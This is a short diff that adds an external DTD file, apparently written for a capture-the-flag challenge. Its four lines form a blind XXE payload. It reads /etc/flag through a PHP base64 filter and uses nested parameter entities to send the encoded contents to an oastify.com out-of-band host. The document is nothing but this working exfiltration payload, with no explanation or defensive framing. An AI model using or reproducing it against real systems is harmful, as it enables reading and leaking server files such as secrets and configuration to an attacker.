@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'vyxlb5ho71lp4hn527s9g2vjgam9ay.oastify.com/?a=%file;'>">
+%eval;
+%test;
